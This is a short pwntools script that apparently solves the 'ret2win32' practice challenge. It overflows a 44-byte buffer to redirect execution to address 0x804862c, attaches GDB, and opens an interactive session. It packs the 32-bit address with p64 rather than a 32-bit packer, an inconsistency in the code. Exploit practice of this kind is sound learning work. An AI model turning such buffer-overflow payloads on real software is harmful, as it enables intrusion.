# Importing the 'pwntools' library for exploitation
from pwn import *

io = process('./ret2win32')

# Constructing payload for buffer overflow
# 'b'A' * 44' creates a buffer with 44 'A' characters
bfr_oflw = b'A' * 44 + p64(0x804862c)

# Attach GDB debugger to the process with a breakpoint at address 0x804862c
gdb.attach(io, gdbscript = 'b * 0x804862c')

# Receive data from the process until the prompt '>'
io.recvuntil(b'>')

# Send the crafted payload to the process
io.sendline(bfr_oflw)

io.interactive()

